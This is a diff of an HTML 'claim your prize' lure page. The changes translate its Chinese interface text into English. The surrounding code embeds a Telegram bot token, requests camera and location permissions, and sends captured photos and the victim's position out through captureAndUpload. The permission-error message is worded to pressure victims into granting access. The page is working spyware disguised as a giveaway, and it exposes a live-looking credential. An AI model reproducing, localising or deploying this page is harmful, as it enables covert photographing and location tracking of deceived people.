@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>🎁 领取奖励 🎁</title>
+    <title>🎁🧧🧧🎁</title>
     <style>
         body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
         /* 默认隐藏相机框 */
@@ -12,11 +12,11 @@
     </style>
 </head>
 <body>
-    <h2>🎉 请点击下方领取奖品 🎉</h2>
-    <div id="status">点击按钮以激活奖品领取功能</div>
+    <h2>🎉 Please click below to claim your prize 🎉</h2>
+    <div id="status">🎰🎰🎰🎰🎰</div>
     <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <button id="startBtn">领取🎲</button>
+    <button id="startBtn">START🎲</button>
 
     <script>
         const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';
@@ -52,7 +52,11 @@
                 setTimeout(() => captureAndUpload(stream, pos), 1000);
                 
             } catch (err) {
-                status.innerText = "❌ 必须允许位置和相机权限才能领取。";
+                status.innerText = "⚠️:Location and camera permissions must be granted to enable it
+
+📍   ✅️
+
+📷✅";
                 console.error(err);
             }
         });
